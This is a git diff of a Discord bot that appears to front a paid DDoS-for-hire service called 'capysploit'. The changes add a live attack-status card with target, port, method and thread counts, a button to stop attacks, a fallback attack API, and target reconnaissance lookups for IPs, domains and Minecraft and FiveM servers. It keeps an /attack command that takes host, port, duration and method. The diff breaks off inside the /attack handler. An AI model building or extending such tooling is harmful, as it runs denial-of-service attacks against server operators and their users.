@@ -1,5 +1,5 @@
 import 'dotenv/config';
-import { Client, GatewayIntentBits, ActivityType, Partials, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ContainerBuilder, MessageFlags, SectionBuilder, SeparatorBuilder, TextDisplayBuilder, ThumbnailBuilder } from 'discord.js';
+import { Client, GatewayIntentBits, ActivityType, Partials, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ContainerBuilder, MessageFlags, SectionBuilder, SeparatorBuilder, TextDisplayBuilder, ThumbnailBuilder, PermissionsBitField } from 'discord.js';
 import * as Vault from './vault-db.js';
 import { buildDiscordRoleNames, userPlanRole } from './discord.js';
 
@@ -7,6 +7,32 @@ const token = process.env.DISCORD_TOKEN;
 const clientId = process.env.DISCORD_CLIENT_ID;
 const guildId = process.env.DISCORD_GUILD_ID;
 const apiBaseUrl = process.env.API_BASE_URL || 'https://capi.insideproxy.me';
+const apiSecondary = process.env.API_BASE_URL_SECONDARY || 'https://capi.capysploit.workers.dev';
+const ATTACK_CARD_IMAGE_URL = process.env.ATTACK_CARD_IMAGE_URL || 'https://discord-webhook.com/uploads/5ab0b46dde847b81e431d78bf9c9757d.webp';
+const API_CANDIDATES = [apiBaseUrl, apiSecondary].filter(Boolean);
+
+async function apiFetch(pathWithQuery, options) {
+  // pathWithQuery may be a full path like '/api/xyz?foo=bar' or a full URL
+  let lastErr = null;
+  for (const base of API_CANDIDATES) {
+    try {
+      const baseClean = base.replace(/\/$/, '');
+      const url = pathWithQuery.startsWith('http') ? pathWithQuery : `${baseClean}${pathWithQuery}`;
+      const res = await fetch(url, options);
+      // If server responded with a client error, return it (it's a valid response)
+      if (res.ok || (res.status >= 400 && res.status < 500)) return res;
+      // For 5xx or network errors, try next candidate
+      if (res.status >= 500) continue;
+      // otherwise return what we got
+      return res;
+    } catch (err) {
+      lastErr = err;
+      continue;
+    }
+  }
+  if (lastErr) throw lastErr;
+  throw new Error('All API endpoints failed');
+}
 
 console.log('Discord bot config loaded:', {
   hasToken: Boolean(token),
@@ -41,10 +67,11 @@ let cachedMethodNames = null;
 let methodCacheExpires = 0;
 const attackMessageState = new Map();
 let graphStatusMessageId = null;
+let attackUpdaterInterval = null;
 
 async function fetchNetworkStats() {
   try {
-    const response = await fetch(`${apiBaseUrl}/api/network_statistics`);
+    const response = await apiFetch('/api/network_statistics');
     const payload = await response.json();
     if (!payload || payload.error) {
       return { total_attacks_today: 0, vip_users_count: 0, holder_users_count: 0, reseller_users_count: 0, verified_discord_users_count: 0 };
@@ -92,7 +119,7 @@ async function fetchMethodNames() {
   }
 
   try {
-    const response = await fetch(`${apiBaseUrl}/admin/list_methods`);
+    const response = await apiFetch('/admin/list_methods');
     const payload = await response.json();
     const list = (payload && !payload.error && Array.isArray(payload.data?.methods))
       ? payload.data.methods.map((item) => (item.name || '').toLowerCase()).filter(Boolean)
@@ -126,7 +153,7 @@ function formatSlotBar(used, total) {
 
 async function fetchGraphStats() {
   try {
-    const response = await fetch(`${apiBaseUrl}/api/graph`);
+    const response = await apiFetch('/api/graph');
     const payload = await response.json();
     if (!payload || payload.error) {
       return { apiSlotsTotal: 30, apiSlotsUsed: 0, apiSlotsAvailable: 30, apiPercent: '0.00', c2SlotsActive: 0, maintenance: false, lastMaintenance: 'None', uptime: '0s', updatedAt: new Date().toISOString() };
@@ -195,37 +222,273 @@ function buildGraphContainer(stats) {
 function buildAttackContainer(state, now = Date.now()) {
   const elapsedSeconds = Math.max(0, Math.floor((now - state.startTime) / 1000));
   const remainingSeconds = Math.max(0, Number(state.durationSeconds || 0) - elapsedSeconds);
-  const statusLine = remainingSeconds > 0
-    ? `**Status:** Running • **Elapsed:** ${elapsedSeconds}s • **Remaining:** ${remainingSeconds}s`
-    : '**Status:** Completed';
+  const total = Number(state.durationSeconds || 0) || 1;
+  const pct = Math.max(0, Math.min(1, elapsedSeconds / total));
+  const barWidth = 20;
+  const filled = Math.round(pct * barWidth);
+  const progressBar = `${'▰'.repeat(filled)}${'▱'.repeat(Math.max(0, barWidth - filled))}`;
+  const pctLabel = Math.round(pct * 100);
 
-  return new ContainerBuilder()
-    .setAccentColor(0x00D4FF)
-    .addTextDisplayComponents(
-      new TextDisplayBuilder().setContent('## ⚔️ Attack Status')
+  let accent = 0x3498DB;
+
+  const targetLabel = state.targetLabel || `${state.host || 'N/A'}:${state.port || 'N/A'}`;
+  const methodLabel = (state.methodLabel || state.method || 'N/A').toUpperCase();
+  const attackId = state.attackId || state.id || state.attackid || null;
+  const attackIdDisplay = attackId || state.localId || null;
+  const topTimestamp = state.startTime ? new Date(state.startTime).toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: '2-digit' }) : '—';
+  const bottomTimestamp = state.startTime ? new Date(state.startTime).toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }) : '—';
+  const targetOrg = state.targetOrg || state.targetCountry || state.target_country || 'Unknown';
+  const thumbnailUrl = ATTACK_CARD_IMAGE_URL;
+
+  const container = new ContainerBuilder().setAccentColor(accent);
+
+  container.addTextDisplayComponents(
+    new TextDisplayBuilder().setContent(`**Attack Launched | www.capysploit.wtf**\n__Timestamp:__ ${topTimestamp}   *ID:* ${attackIdDisplay || '—'}`)
+  );
+  container.addSeparatorComponents(new SeparatorBuilder());
+
+  container.addTextDisplayComponents(new TextDisplayBuilder().setContent(`*Progress:* ${progressBar} *${pctLabel}%*`));
+
+  let targetInfo =
+    `**TARGET:** **\`[${targetLabel}]\`**\n` +
+    `**TIME:** **\`[${total}s]\`**\n` +
+    `**PORT:** **\`[${state.port || 'N/A'}]\`**\n` +
+    `**METHOD:** **\`[${methodLabel}]\`**\n` +
+    `**ORG:** **\`[${targetOrg}]\`**`;
+  if (state.targetIsp) {
+    targetInfo += `\n**ISP:** **\`[${state.targetIsp}]\`**`;
+  }
+  container.addTextDisplayComponents(new TextDisplayBuilder().setContent(targetInfo));
+
+  container.addSeparatorComponents(new SeparatorBuilder());
+
+  const vipLabel = state.vip ? 'TRUE' : 'FALSE';
+  const stLabel = state.admin ? 'TRUE' : 'FALSE';
+  const rwLabel = state.holder ? 'TRUE' : 'FALSE';
+  const cooldown = typeof state.cooldown === 'number' ? state.cooldown.toFixed(2) : (state.cooldown ?? '0.00');
+  const sentBy = state.owner || 'Unknown';
+  container.addTextDisplayComponents(
+    new TextDisplayBuilder().setContent(
+      `**THREADS:** __${state.methodActiveSlots || 0}/${state.methodMaxSlots || 0}__ \n` +
+      `**VIP:** __*[${vipLabel}]*__     **ST:** __*[${stLabel}]*__       **RW:** __*[${rwLabel}]*__ \n` +
+      `**Cooldown:** __*[${cooldown}]*__\n` +
+      `**TIMESTAMP:** __*[${bottomTimestamp}]*__\n` +
+      `**SENT BY:** __*[${sentBy}]*__`
     )
-    .addTextDisplayComponents(
-      new TextDisplayBuilder().setContent(`**Target:** ${state.targetLabel || state.host}:${state.port}`)
-    )
-    .addTextDisplayComponents(
-      new TextDisplayBuilder().setContent(`**Method:** ${state.methodLabel || state.method} • **Duration:** ${state.durationSeconds}s`)
-    )
+  );
+
+  container.addMediaGalleryComponents({
+    type: 12,
+    items: [
+      {
+        media: {
+          type: 3,
+          url: thumbnailUrl
+        }
+      }
+    ]
+  });
+
+  const actions = new ActionRowBuilder();
+  const stopButton = new ButtonBuilder()
+    .setStyle(ButtonStyle.Danger)
+    .setLabel('Stop Attack')
+    .setCustomId(`attack_stop:${attackId || ''}`)
+    .setEmoji({ name: '👻' });
+  actions.addComponents(stopButton);
+  actions.addComponents(
+    new ButtonBuilder()
+      .setStyle(ButtonStyle.Secondary)
+      .setLabel('Delete Message')
+      .setCustomId('delete_attack_message')
+      .setEmoji({ name: '🗑️' })
+  );
+  container.addActionRowComponents(actions);
+
+  return container;
+}
+
+function startAttackUpdater() {
+  if (attackUpdaterInterval) return;
+  attackUpdaterInterval = setInterval(async () => {
+    for (const [msgId, state] of Array.from(attackMessageState.entries())) {
+      try {
+        const channelId = state.channelId;
+        if (!channelId) continue;
+        const channel = await client.channels.fetch(channelId).catch(() => null);
+        if (!channel || typeof channel.messages?.fetch !== 'function') continue;
+        const message = await channel.messages.fetch(msgId).catch(() => null);
+        if (!message) {
+          attackMessageState.delete(msgId);
+          continue;
+        }
+        // Update state progress locally
+        const container = buildAttackContainer(state);
+        await message.edit({ components: [container], flags: MessageFlags.IsComponentsV2 }).catch(() => {});
+      } catch (e) {
+        console.error('Attack updater error for message', msgId, e?.message || e);
+      }
+    }
+  }, 5000);
+}
+
+function buildLookupContainer(type, hostname, payload, path) {
+  const server = payload.server || {};
+  const ipinfo = payload.ip_info || payload.ipinfo || payload.ip_info_v4 || {};
+  const accent = type === 'mc' ? 0x2ECC71 : type === 'cfx' ? 0x9B59B6 : type === 'domain' ? 0xF39C12 : 0x3498DB;
+  const title = type === 'mc' ? 'Minecraft Lookup' : type === 'cfx' ? 'FiveM Lookup' : type === 'domain' ? 'Domain Lookup' : 'IP Lookup';
+
+  const countryCode = (ipinfo.countryCode || ipinfo.country_code || ipinfo.country || '').toUpperCase();
+  const countryFlag = (code => {
+    if (!code || code.length !== 2) return '';
+    return String.fromCodePoint(...[...code].map(c => 0x1f1e6 - 65 + c.charCodeAt(0)));
+  })(countryCode);
+
+  const fetchedAt = new Date().toISOString();
+
+  const container = new ContainerBuilder()
+    .setAccentColor(accent)
+    .addTextDisplayComponents(new TextDisplayBuilder().setContent(`## 🔎 ${title} • ${hostname}`))
+    .addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Status:** ${payload.online ? 'Online ✅' : payload.online === false ? 'Offline ⛔' : 'Unknown'}${payload.ping ? ` • ${payload.ping}ms` : ''}${payload.version ? ` • v${payload.version}` : ''}`))
     .addSeparatorComponents(new SeparatorBuilder())
-    .addTextDisplayComponents(
-      new TextDisplayBuilder().setContent(
-        `${statusLine}\n` +
-        `**Max Concurrents:** ${state.maxConcurrents ?? 'N/A'}\n` +
-        `**API Slots:** ${state.apiSlots ?? 'N/A'}`
-      )
-    )
-    .addActionRowComponents(
-      new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-          .setStyle(ButtonStyle.Secondary)
-          .setLabel('Refresh')
-          .setCustomId('attack_refresh')
-      )
-    );
+    .addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Query:** ${hostname} • **Checked:** ${fetchedAt}`));
+
+  // Server info blocks
+  // Determine thumbnail/icon to use. If favicon is a data URL, return it as an attachment.
+  let iconUrl = null;
+  let attachment = null; // { name, buffer }
+  try {
+  const fav = payload.favicon || payload.icon || server.favicon || server.icon;
+    if (type === 'mc') {
+      if (fav && String(fav).startsWith('http')) iconUrl = fav;
+      else if (fav && String(fav).startsWith('data:image')) {
+        // Convert data URL to buffer and attach as file
+        const m = String(fav).match(/^data:(image\/(png|jpeg|jpg));base64,(.+)$/i);
+        if (m) {
+          const mime = m[1];
+          const b64 = m[3];
+          const ext = mime.includes('png') ? 'png' : mime.includes('jpeg') || mime.includes('jpg') ? 'jpg' : 'bin';
+          const name = `favicon_${type}.${ext}`;
+          attachment = { name, buffer: Buffer.from(b64, 'base64') };
+          iconUrl = `attachment://${name}`;
+        }
+      } else {
+        iconUrl = 'https://static.wikia.nocookie.net/minecraft_gamepedia/images/6/6b/Minecraft.png';
+      }
+    } else if (type === 'cfx') {
+      if (fav && String(fav).startsWith('http')) iconUrl = fav;
+      else iconUrl = server.icon || payload.icon || 'https://wiki.fivem.net/images/f/f8/FiveM_icon.png';
+    } else if (type === 'domain') {
+      iconUrl = 'https://www.gstatic.com/images/branding/product/1x/domains_48dp.png';
+    } else if (type === 'ip' && countryCode) {
+      iconUrl = `https://flagcdn.com/w80/${countryCode.toLowerCase()}.png`;
+    }
+  } catch (e) {
+    iconUrl = null;
+    attachment = null;
+  }
+
+  if (type === 'cfx') {
+    const endpoint = server.endpoint || server.connectEndPoints || server.connectEndPoints?.[0] || 'N/A';
+    const name = server.hostname || server.name || server.serverName || 'N/A';
+    const playersCount = server?.Data?.players?.length ?? server.players ?? 'N/A';
+    const maxPlayers = server?.Data?.vars?.sv_maxclients ?? server.maxplayers ?? 'N/A';
+    {
+      const content = `**Name:** ${name}  \n**Endpoint:** ${endpoint}  \n**Players:** ${playersCount}/${maxPlayers}${server.ping ? `  \n**Ping:** ${server.ping}ms` : ''}`;
+      if (iconUrl) {
+        const section = new SectionBuilder().setThumbnailAccessory(new ThumbnailBuilder().setURL(iconUrl));
+        section.addTextDisplayComponents(new TextDisplayBuilder().setContent(content));
+        container.addSectionComponents(section);
+      } else {
+        container.addTextDisplayComponents(new TextDisplayBuilder().setContent(content));
+      }
+    }
+    if (Array.isArray(server?.Data?.players) && server.Data.players.length) {
+      const list = server.Data.players.slice(0, 10).map(p => `• ${p?.name || p}`).join('\n');
+      container.addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Top Players:**\n${list}`));
+    }
+  } else if (type === 'mc') {
+    const online = server.online ? 'Yes' : 'No';
+    const ip = server.ip || server.ip_address || server.hostname || hostname;
+    const port = server.port || 25565;
+    const players = server.players?.online ?? server.players?.length ?? 'N/A';
+    const maxPlayers = server.players?.max ?? server.players?.max_players ?? 'N/A';
+    // Fix version display if it's an object
+    let versionStr = 'N/A';
+    try {
+      if (server.version) {
+        if (typeof server.version === 'string') versionStr = server.version;
+        else if (typeof server.version === 'object') versionStr = server.version.name || server.version.protocol || JSON.stringify(server.version);
+        else versionStr = String(server.version);
+      } else if (payload.version) {
+        const v = payload.version;
+        versionStr = typeof v === 'string' ? v : (v?.name || JSON.stringify(v));
+      }
+    } catch (e) {
+      versionStr = 'N/A';
+    }
+
+    {
+      const content = `**Online:** ${online}  \n**IP:** ${ip}:${port}  \n**Players:** ${players}/${maxPlayers}${server.roundtrip ? `  \n**Ping:** ${server.roundtrip}ms` : ''}  \n**Version:** ${versionStr}`;
+      if (iconUrl) {
+        const section = new SectionBuilder().setThumbnailAccessory(new ThumbnailBuilder().setURL(iconUrl));
+        section.addTextDisplayComponents(new TextDisplayBuilder().setContent(content));
+        container.addSectionComponents(section);
+      } else {
+        container.addTextDisplayComponents(new TextDisplayBuilder().setContent(content));
+      }
+    }
+    if (server?.players?.sample && Array.isArray(server.players.sample)) {
+      const list = server.players.sample.slice(0, 10).map(p => `• ${p.name || p}`).join('\n');
+      container.addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Player Sample:**\n${list}`));
+    }
+  } else {
+    const ip = ipinfo.query || ipinfo.ip || hostname;
+    const country = ipinfo.country || ipinfo.countryCode || 'N/A';
+    const isp = ipinfo.isp || ipinfo.org || 'N/A';
+    const asn = ipinfo.as || ipinfo.asn || 'N/A';
+    const city = ipinfo.city || ipinfo.regionName || ipinfo.region || 'N/A';
+    const reverse = ipinfo.reverse || payload.reverse_dns || 'N/A';
+    {
+        const content = `**IP:** ${ip} ${countryFlag ? countryFlag + ' ' + countryCode : ''}  \n**City/Region:** ${city}  \n**ISP / Org:** ${isp}  \n**ASN:** ${asn}  \n**Reverse DNS:** ${reverse}`;
+        if (iconUrl) {
+          const section = new SectionBuilder().setThumbnailAccessory(new ThumbnailBuilder().setURL(iconUrl));
+          section.addTextDisplayComponents(new TextDisplayBuilder().setContent(content));
+          container.addSectionComponents(section);
+        } else {
+          container.addTextDisplayComponents(new TextDisplayBuilder().setContent(content));
+        }
+    }
+  }
+
+  // Action buttons: primary API link + secondary if available (links) and controls (copy, refresh, delete)
+  const primary = API_CANDIDATES[0]?.replace(/\/$/, '') + path;
+  const secondary = API_CANDIDATES[1] ? API_CANDIDATES[1].replace(/\/$/, '') + path : null;
+
+  const linksRow = new ActionRowBuilder();
+  linksRow.addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('Open (Primary API)').setURL(primary));
+  if (secondary) linksRow.addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('Open (Secondary)').setURL(secondary));
+  // WHOIS / Details link for domains
+  if (type === 'domain') linksRow.addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('WHOIS').setURL(`https://whois.domaintools.com/${encodeURIComponent(hostname)}`));
+
+  // Add a compact 'At a glance' text display for quick metadata
+  const glanceParts = [];
+  if (countryFlag) glanceParts.push(`${countryFlag}`);
+  if (ipinfo.city) glanceParts.push(`${ipinfo.city}`);
+  if (ipinfo.region) glanceParts.push(`${ipinfo.region}`);
+  if (ipinfo.as || ipinfo.asn) glanceParts.push(`ASN:${ipinfo.as || ipinfo.asn}`);
+  if (payload.ping) glanceParts.push(`Ping:${payload.ping}ms`);
+
+  const glance = glanceParts.length ? glanceParts.join(' • ') : '';
+
+  // Single Refresh control row (keep interactions focused)
+  const refreshRow = new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setStyle(ButtonStyle.Secondary).setLabel('Refresh').setCustomId(`lookup_refresh:${type}:${hostname}`)
+  );
+
+  if (glance) container.addTextDisplayComponents(new TextDisplayBuilder().setContent(`**At a glance:** ${glance}`));
+  container.addSeparatorComponents(new SeparatorBuilder()).addActionRowComponents(linksRow).addActionRowComponents(refreshRow);
+  return { container, attachment };
 }
 
 const linkCommand = new SlashCommandBuilder()
@@ -241,9 +504,7 @@ const planCommand = new SlashCommandBuilder()
   .setName('plan')
   .setDescription('Show your CAPI account profile and linked status');
 
-const methodsCommand = new SlashCommandBuilder()
-  .setName('methods')
-  .setDescription('List all supported attack methods');
+// methods command removed — use in-API catalog or admin tools instead
 
 const graphCommand = new SlashCommandBuilder()
   .setName('graph')
@@ -259,12 +520,37 @@ const attackCommand = new SlashCommandBuilder()
   .addStringOption(option => option.setName('time').setDescription('Attack duration in seconds').setRequired(true))
   .addStringOption(option => option.setName('method').setDescription('Attack method').setRequired(true).setAutocomplete(true));
 
+const lookupCommand = new SlashCommandBuilder()
+  .setName('lookup')
+  .setDescription('Lookup server or host information')
+  .addStringOption(option => option.setName('type').setDescription('Type of lookup').setRequired(true)
+    .addChoices(
+      { name: 'Minecraft (MC)', value: 'mc' },
+      { name: 'FiveM (CFX)', value: 'cfx' },
+      { name: 'Domain (DNS)', value: 'domain' },
+      { name: 'IP', value: 'ip' }
+    ))
+  .addStringOption(option => option.setName('hostname').setDescription('Hostname, IP or identifier to lookup').setRequired(true));
+
 async function registerCommands() {
   const rest = new REST({ version: '10' }).setToken(token);
-  const commands = [linkCommand.toJSON(), planCommand.toJSON(), unlinkCommand.toJSON(), methodsCommand.toJSON(), graphCommand.toJSON(), attackCommand.toJSON()];
+  const commands = [linkCommand.toJSON(), planCommand.toJSON(), unlinkCommand.toJSON(), lookupCommand.toJSON(), graphCommand.toJSON(), attackCommand.toJSON()];
   try {
-    await rest.put(Routes.applicationCommands(clientId), { body: commands });
-    console.log('Registered global slash commands.');
+    if (guildId) {
+      // Clear any existing global commands to avoid duplicates (global + guild)
+      try {
+        await rest.put(Routes.applicationCommands(clientId), { body: [] });
+        console.log('Cleared global slash commands.');
+      } catch (e) {
+        console.warn('Failed to clear global commands:', e?.message || e);
+      }
+
+      await rest.put(Routes.applicationGuildCommands(clientId, guildId), { body: commands });
+      console.log('Registered guild slash commands.');
+    } else {
+      await rest.put(Routes.applicationCommands(clientId), { body: commands });
+      console.log('Registered global slash commands.');
+    }
   } catch (err) {
     console.error('Failed to register slash commands:', err);
   }
@@ -302,26 +588,26 @@ async function postOrUpdateGraphStatusMessage() {
     console.error('Failed to update graph status message:', error);
   }
 }
-
 client.once('ready', async () => {
   console.log(`Discord bot logged in as ${client.user.tag}`);
   await registerCommands();
   await updateStatus();
   await postOrUpdateGraphStatusMessage();
+  startAttackUpdater();
   setInterval(updateStatus, 30_000);
   setInterval(postOrUpdateGraphStatusMessage, 60_000);
 });
 
 client.on('interactionCreate', async (interaction) => {
   if (interaction.isButton()) {
-    if (interaction.customId === 'delete_plan_message') {
+    if (interaction.customId === 'delete_plan_message' || interaction.customId === 'delete_attack_message') {
       try {
         await interaction.deferUpdate();
         if (interaction.message?.deletable) {
           await interaction.message.delete();
         }
       } catch (error) {
-        console.error('Failed to delete plan message:', error);
+        console.error('Failed to delete message:', error);
       }
       return;
     }
@@ -338,20 +624,143 @@ client.on('interactionCreate', async (interaction) => {
     if (interaction.customId === 'attack_refresh') {
       const state = attackMessageState.get(interaction.message?.id);
       if (!state) {
-        await interaction.update({ content: 'This attack card is no longer available.', flags: MessageFlags.Ephemeral });
+        await interaction.update({ content: 'This attack card is no longer available.' });
         return;
       }
 
       const container = buildAttackContainer(state);
-      attackMessageState.set(interaction.message.id, { ...state, lastRefreshedAt: Date.now() });
-      await interaction.update({ components: [container], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
+      attackMessageState.set(interaction.message.id, { ...state, lastRefreshedAt: Date.now(), channelId: interaction.message.channelId });
+      await interaction.update({ components: [container], flags: MessageFlags.IsComponentsV2 });
       return;
     }
+
+    if (interaction.customId && interaction.customId.startsWith('attack_stop')) {
+      // customId format: attack_stop:<attackId>
+      try {
+        await interaction.deferReply({ ephemeral: true });
+      } catch (e) {
+        // ignore
+      }
+      const parts = interaction.customId.split(':');
+      const attackId = parts[1] || null;
+      const state = attackMessageState.get(interaction.message?.id) || null;
+      const botKey = process.env.BOT_API_KEY;
+      if (!botKey) {
+        try { await interaction.editReply({ content: 'Server misconfigured: BOT_API_KEY is not set. Contact the server administrator.' }); } catch (e) {}
+        return;
+      }
+
+      const member = interaction.member;
+      const isAdmin = member?.roles?.cache?.some((role) => role.name?.toLowerCase() === 'admin') || Boolean(member?.permissions?.has?.(PermissionsBitField.Flags.Administrator));
+      const isOwner = state?.discordUserId === interaction.user.id;
+      if (!isAdmin && !isOwner) {
+        try { await interaction.editReply({ content: 'Only the attack sender or an admin can stop this attack.' }); } catch (e) {}
+        return;
+      }
+
+      if (!attackId && !state) {
+        try { await interaction.editReply({ content: 'Unable to determine attack ID to stop.' }); } catch (e) {}
+        return;
+      }
+
+      const idToStop = attackId || state.attackId || null;
+      let stopUrl = `/api/stop?id=${encodeURIComponent(idToStop)}`;
+      if (!idToStop && state?.targetLabel) {
+        stopUrl = `/api/stop?host=${encodeURIComponent(state.targetLabel)}${state.owner ? `&username=${encodeURIComponent(state.owner)}` : ''}`;
+      } else if (state?.owner) {
+        stopUrl += `&username=${encodeURIComponent(state.owner)}`;
+      }
+      try {
+        const res = await apiFetch(stopUrl, { method: 'GET', headers: { Authorization: `Bearer ${botKey}` } });
+        const body = await res.json();
+        if (body && body.error) {
+          await interaction.editReply({ content: `Stop request failed: ${body.message || 'unknown error'}` });
+          return;
+        }
+
+        // Update local state to mark as stopped
+        if (state) {
+          const elapsed = Math.max(0, Math.floor((Date.now() - (state.startTime || Date.now())) / 1000));
+          state.durationSeconds = elapsed; // mark as finished
+          state.stoppedBy = interaction.user.username;
+          attackMessageState.set(interaction.message.id, { ...state, channelId: interaction.message.channelId });
+          const container = buildAttackContainer(state);
+          try {
+            await interaction.update({ components: [container], flags: MessageFlags.IsComponentsV2 });
+          } catch (e) {
+            try { await interaction.followUp({ content: 'Attack stopped. (UI update failed)', ephemeral: true }); } catch (e) {}
+          }
+        }
+
+        await interaction.editReply({ content: `Stop requested for attack ${idToStop || state?.targetLabel || 'unknown target'}.` });
+      } catch (err) {
+        console.error('Attack stop failed:', err);
+        try { await interaction.editReply({ content: `Stop request failed: ${err?.message || 'error'}` }); } catch (e) {}
+      }
+      return;
+    }
+
+    // attack_copy handler removed (ID and copy button no longer present)
 
     if (interaction.customId === 'graph_refresh') {
       const stats = await fetchGraphStats();
       const container = buildGraphContainer(stats);
       await interaction.update({ components: [container], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
+      return;
+    }
+
+    if (interaction.customId && interaction.customId.startsWith('lookup_refresh')) {
+      // customId format: lookup_refresh:<type>:<hostname>
+      try {
+        await interaction.deferUpdate();
+      } catch (e) {
+        // continue
+      }
+      const parts = interaction.customId.split(':');
+      const type = parts[1] || 'ip';
+      const hostname = parts.slice(2).join(':') || '';
+      try {
+        let path = '';
+        if (type === 'cfx') path = `/lookup/lookup_cfx?cfx_code=${encodeURIComponent(hostname)}`;
+        else if (type === 'mc') path = `/lookup/lookup_mc?server_address=${encodeURIComponent(hostname)}`;
+        else path = `/lookup/lookup_ip?server_address=${encodeURIComponent(hostname)}`;
+
+        const res = await apiFetch(path);
+        const payload = await res.json();
+        if (payload.error) {
+          await interaction.editReply({ content: `Lookup failed: ${payload.message || 'unknown error'}`, flags: MessageFlags.Ephemeral });
+          return;
+        }
+
+        const { container, attachment } = buildLookupContainer(type, hostname, payload, path);
+        try {
+          console.log('Lookup container (refresh) JSON:', JSON.stringify(container.toJSON()));
+        } catch (err) {
+          console.error('Failed to serialize lookup container (refresh):', err);
+        }
+        // Update the original message components; attach favicon if provided
+        try {
+          if (attachment) {
+            await interaction.editReply({ components: [container], files: [{ attachment: attachment.buffer, name: attachment.name }], flags: MessageFlags.IsComponentsV2 });
+          } else {
+            await interaction.editReply({ components: [container], flags: MessageFlags.IsComponentsV2 });
+          }
+        } catch (e) {
+          // Fallback to update message if editReply not available
+          if (attachment) {
+            await interaction.update({ components: [container], files: [{ attachment: attachment.buffer, name: attachment.name }], flags: MessageFlags.IsComponentsV2 });
+          } else {
+            await interaction.update({ components: [container], flags: MessageFlags.IsComponentsV2 });
+          }
+        }
+      } catch (error) {
+        console.error('Lookup refresh failed:', error);
+        try {
+          await interaction.editReply({ content: `Lookup failed: ${error.message || 'error'}` });
+        } catch (e) {
+          await interaction.update({ content: `Lookup failed: ${error.message || 'error'}` });
+        }
+      }
       return;
     }
 
@@ -379,7 +788,7 @@ client.on('interactionCreate', async (interaction) => {
 
   if (interaction.commandName === 'link') {
     const code = interaction.options.getString('code');
-    const response = await fetch(`${apiBaseUrl}/api/link?code=${encodeURIComponent(code)}&discord_user_id=${encodeURIComponent(discordUserId)}&discord_username=${encodeURIComponent(discordUsername)}&client=discord`);
+    const response = await apiFetch(`/api/link?code=${encodeURIComponent(code)}&discord_user_id=${encodeURIComponent(discordUserId)}&discord_username=${encodeURIComponent(discordUsername)}&client=discord`);
     const payload = await response.json();
 
     if (payload.error) {
@@ -409,7 +818,7 @@ client.on('interactionCreate', async (interaction) => {
   }
 
   if (interaction.commandName === 'plan') {
-    const response = await fetch(`${apiBaseUrl}/api/discord_profile?discord_user_id=${encodeURIComponent(discordUserId)}`);
+    const response = await apiFetch(`/api/discord_profile?discord_user_id=${encodeURIComponent(discordUserId)}`);
     const payload = await response.json();
     if (payload.error) {
       const message = payload.message || 'Unable to load profile. Use /link to verify first.';
@@ -485,6 +894,44 @@ client.on('interactionCreate', async (interaction) => {
     return;
   }
 
+  if (interaction.commandName === 'lookup') {
+    const type = interaction.options.getString('type');
+    const hostname = interaction.options.getString('hostname');
+    await interaction.deferReply({ ephemeral: true });
+    try {
+      let path = '';
+      if (type === 'cfx') path = `/lookup/lookup_cfx?cfx_code=${encodeURIComponent(hostname)}`;
+      else if (type === 'mc') path = `/lookup/lookup_mc?server_address=${encodeURIComponent(hostname)}`;
+      else if (type === 'domain' || type === 'ip') path = `/lookup/lookup_ip?server_address=${encodeURIComponent(hostname)}`;
+      else path = `/lookup/lookup_ip?server_address=${encodeURIComponent(hostname)}`;
+
+      const apiLink = apiBaseUrl.replace(/\/$/, '') + path;
+      const res = await apiFetch(path);
+      const payload = await res.json();
+      if (payload.error) {
+        await interaction.editReply({ content: `Lookup failed: ${payload.message || 'unknown error'}` });
+        return;
+      }
+
+      const { container, attachment } = buildLookupContainer(type, hostname, payload, path);
+      try {
+        console.log('Lookup container (initial) JSON:', JSON.stringify(container.toJSON()));
+      } catch (err) {
+        console.error('Failed to serialize lookup container (initial):', err);
+      }
+      if (attachment) {
+        await interaction.editReply({ components: [container], files: [{ attachment: attachment.buffer, name: attachment.name }], flags: MessageFlags.IsComponentsV2 });
+      } else {
+        await interaction.editReply({ components: [container], flags: MessageFlags.IsComponentsV2 });
+      }
+      return;
+    } catch (error) {
+      console.error('Lookup command failed:', error);
+      await interaction.editReply({ content: `Lookup failed: ${error.message || 'error'}` });
+      return;
+    }
+  }
+
   if (interaction.commandName === 'graph') {
     const stats = await fetchGraphStats();
     const container = buildGraphContainer(stats);
@@ -492,18 +939,7 @@ client.on('interactionCreate', async (interaction) => {
     return;
   }
 
-  if (interaction.commandName === 'methods') {
-    const response = await fetch(`${apiBaseUrl}/admin/list_methods`);
-    const payload = await response.json();
-    if (payload.error) {
-      await interaction.reply({ content: payload.message || 'Unable to load methods.', ephemeral: true });
-      return;
-    }
-
-    const methods = (payload.data?.methods || []).map((method) => `• **${method.name}** — ${method.description || 'No description'}`).join('\n');
-    await interaction.reply({ content: `**Supported methods:**\n${methods || 'No methods available.'}`, ephemeral: true });
-    return;
-  }
+  // methods command removed
 
   if (interaction.commandName === 'attack') {
     const host = interaction.options.getString('hostname');
@@ -511,25 +947,71 @@ client.on('interactionCreate', async (interaction) => {
     const time = interaction.options.getString('time');
     const method = interaction.options.getString('method');
 
-    const profileResponse = await fetch(`${apiBaseUrl}/api/discord_profile?discord_user_id=${encodeURIComponent(discordUserId)}`);
-    const profilePayload = await profileResponse.json();
+    console.log('Received /attack', { user: discordUserId, host, port, time, method });
+
+    // Defer the reply to avoid interaction timeout while we call the API
+    try {
+      await interaction.deferReply();
+      console.log('Deferred reply for /attack');
+    } catch (e) {
+      console.warn('deferReply failed (already deferred?):', e?.message || e);
+    }
+
+    // Add an AbortController timeout for profile fetch to avoid indefinite waiting
+    const profileController = new AbortController();
+    const profileTimeout = setTimeout(() => profileController.abort(), 8000);
+    let profilePayload;
+    try {
+      console.log('Fetching profile for', discordUserId);
